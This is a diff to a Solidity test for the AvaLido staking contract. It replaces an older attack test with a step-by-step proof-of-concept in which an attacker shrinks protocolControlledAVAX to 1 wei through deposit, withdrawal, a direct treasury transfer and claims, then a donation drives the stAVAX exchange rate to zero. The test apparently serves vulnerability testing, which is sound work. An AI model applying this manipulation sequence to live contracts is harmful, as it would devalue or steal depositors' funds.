@@ -1563,24 +1563,42 @@ contract AvaLidoTest is DSTest, Helpers {
         cheats.prank(DEPLOYER_ADDRESS);
         lido.setMaxProtocolControlledAVAX(type(uint256).max);
 
-        // Let a user stake 1 AVAX and get stAVAX
-        cheats.deal(USER1_ADDRESS, 1 ether);
-        cheats.prank(USER1_ADDRESS);
-        lido.deposit{value: 1 ether}();
+        // Attacker attempts to set protocolControlledAVAX == 1 wei
 
-        // Attacker now creates 1 stAVAX
-        cheats.deal(USER1_ADDRESS, type(uint256).max);
+        // Attacker has to stake minStakeBatchAmount
+        // 1. Deposit 10 AVAX.
+        cheats.deal(USER1_ADDRESS, 10 ether);
         cheats.prank(USER1_ADDRESS);
-        lido.deposit{value: 1 ether}();
+        lido.deposit{value: 10 ether}();
 
-        // Rate is 1:1 still
-        assertEq(lido.exchangeRateAVAXToStAVAX(), 1 ether);
+        validatorSelectMock(validatorSelectorAddress, "test", 10 ether, 0);
+        lido.initiateStake();
 
-        // Then attacker forces stAVAX value to zero
+        // 2. Make a withdrawal request of 10 ether - 1 wei.
         cheats.prank(USER1_ADDRESS);
-        for (uint256 index = 0; index < 500; index++) {
-            lido.deposit{value: 100000000 ether}();
-        }
-        assertEq(lido.exchangeRateAVAXToStAVAX(), 1 ether);
+        uint256 requestId = lido.requestWithdrawal(10 ether - 1);
+
+        // 3. Forcefully send via contract self-destruct 10 ether - 1 wei to PrincipalTreasury.
+
+        cheats.prank(USER1_ADDRESS);
+        cheats.deal(USER1_ADDRESS, 10 ether - 1);
+        payable(pTreasuryAddress).transfer(10 ether - 1);
+        // 4. Call claimUnstakedPrincipals to fill the withdrawal request.
+
+        cheats.prank(USER1_ADDRESS);
+        lido.claimUnstakedPrincipals();
+
+        // 5. Claim the filled request.
+        cheats.prank(USER1_ADDRESS);
+        lido.claim(requestId, 10 ether - 1);
+
+        console.log(lido.amountStakedAVAX());
+        console.log(lido.protocolControlledAVAX());
+        console.log(lido.exchangeRateAVAXToStAVAX());
+        assertEq(1, lido.protocolControlledAVAX());
+        uint256 frontFrontedAmount = 1 ether;
+        payable(address(lido)).transfer(frontFrontedAmount * lido.protocolControlledAVAX());
+
+        assertEq(lido.exchangeRateAVAXToStAVAX(), 0);
     }
 }
